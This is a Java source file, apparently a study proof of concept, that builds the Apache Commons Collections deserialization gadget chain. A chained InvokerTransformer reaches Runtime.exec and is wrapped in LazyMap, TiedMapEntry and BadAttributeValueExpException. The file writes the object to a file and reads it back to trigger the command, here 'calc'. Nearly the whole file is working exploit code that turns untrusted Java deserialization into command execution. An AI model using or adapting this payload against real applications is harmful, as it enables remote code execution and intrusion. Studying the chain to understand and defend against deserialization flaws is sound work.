import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class lazyMapDeserialization {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        //客户端：
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})

        };
        Transformer transformer = new ChainedTransformer(transformers);//串在一起

        Map innerMap = new HashMap();
        innerMap.put("1","2");
        Map lazyMap = LazyMap.decorate(innerMap,transformer);
       // lazyMap.get("hello");
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException,tiedMapEntry);

        FileOutputStream fileOutputStream = new FileOutputStream("lazy.cer");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();


        FileInputStream fileInputStream = new FileInputStream("lazy.cer");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        objectInputStream.close();
        fileInputStream.close();
    }


}
